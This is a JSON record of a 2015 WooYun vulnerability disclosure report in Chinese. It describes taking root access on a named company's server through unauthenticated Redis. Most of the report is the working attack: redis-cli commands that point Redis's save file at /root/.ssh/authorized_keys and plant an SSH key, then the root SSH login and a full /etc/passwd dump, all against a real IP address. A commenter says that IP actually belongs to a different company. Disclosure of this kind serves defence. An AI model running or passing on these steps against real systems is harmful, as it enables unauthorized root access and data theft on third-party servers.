{"id": 76957, "wybug_id": "wooyun-2015-0163599", "wybug_title": "Redis实例之爱德康赛某系统获取服务器权限", "wybug_corp": "北京爱德康赛广告有限公司", "wybug_author": "路人甲", "wybug_date": "2015-12-22 17:18", "wybug_open_date": "2016-02-04 17:47", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-02-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  58.68.232.140:6379未授权访问1.产生公钥\n\n2.root@kali:/tmp# redis-cli -h 58.68.232.14058.68.232.140:6379> config set dir /root/.ssh/OK58.68.232.140:6379> config set dbfilename authorized_keysOK58.68.232.140:6379> set xxxx \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEj24wh4y7v9NNvhZQ7bURVI91ctK9z/2mK7jODE3XxZlQ+0fd8GxhPeLoXbQeVd5d3TgU/ErgNzD93w/ix1VvXEyCtOCaJ++ojmPzBX2zauYvfcP1Fo/1caOskOAcD1sO3ZxG9JGsQRb9CzZKOPuRAhRBp93lp593A4Zek3yvSSQxlMPt8tWgHuaGbxlOJEo9qJgys7VpSZZSgiaa9L5Y3SD+V7pL88kxadHxWaks6GNoA5tMcR7wV5aE3PvKM3KTWODBdxSv9PW/QoZGNg4tusk3PLGzVGfhpbK+BdaqL8XJvqHJD/ehM47mVM7njVgMf9pzHMNHhE7yjcRNTSg7\\n\\n\\n\"  //ssh-rsa后面添加上一步生产的公钥，id_rsa.pubOK58.68.232.140:6379> saveOK58.68.232.140:6379> exit 3.连接 root@kali:/tmp# ssh 58.68.232.140The authenticity of host '58.68.232.140 (58.68.232.140)' can't be established.ECDSA key fingerprint is e8:ad:39:ab:fb:96:a1:99:9a:58:1a:ef:a3:b2:d4:94.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '58.68.232.140' (ECDSA) to the list of known hosts.Last failed login: Tue Dec 22 16:40:45 CST 2015 from 222.66.115.230 on ssh:nottyThere were 336 failed login attempts since the last successful login.Last login: Tue Dec 22 15:24:35 2015 from 114.111.167.238[root@adconcepts140 ~]# lsanaconda-ks.cfg     azkaban-webserver.log  keystore   projects  zookeeper.outazkaban-access.log  executions             nohup.out  temp[root@adconcepts140 ~]# iduid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[root@adconcepts140 ~]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinpegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:999:998:User for polkitd:/:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinapache:x:48:48:Apache:/usr/share/httpd:/sbin/nologinhacluster:x:189:189:cluster user:/home/hacluster:/sbin/nologinunbound:x:998:996:Unbound DNS resolver:/etc/unbound:/sbin/nologincolord:x:997:995:User for colord:/var/lib/colord:/sbin/nologinavahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinlibstoragemgmt:x:996:994:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologinamandabackup:x:33:6:Amanda user:/var/lib/amanda:/bin/bashsaslauth:x:995:76:\"Saslauthd user\":/run/saslauthd:/sbin/nologinqemu:x:107:107:qemu user:/:/sbin/nologinmemcached:x:994:993:Memcached daemon:/run/memcached:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinradvd:x:75:75:radvd user:/:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinnamed:x:25:25:Named:/var/named:/sbin/nologinhsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologintomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologinpcp:x:993:992:Performance Co-Pilot:/var/lib/pcp:/sbin/nologinmysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologinpostgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bashpostfix:x:89:89::/var/spool/postfix:/sbin/nologindovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologindovenull:x:992:991:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologinchrony:x:991:990::/var/lib/chrony:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/var/lib/oprofile:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinadconcepts:x:1000:1000:adconcepts:/home/adconcepts:/bin/bashtss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinsssd:x:990:989:User for sssd:/:/sbin/nologinhadoop:x:1001:1001::/home/hadoop:/bin/bash   漏洞证明：  \n\n   修复方案：  权限   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n     2015-12-22 17:47 |    \t\t昊昊 \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:44        | ...)\t\t \n  大哥，这是蓝汛通信技术的IP！！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}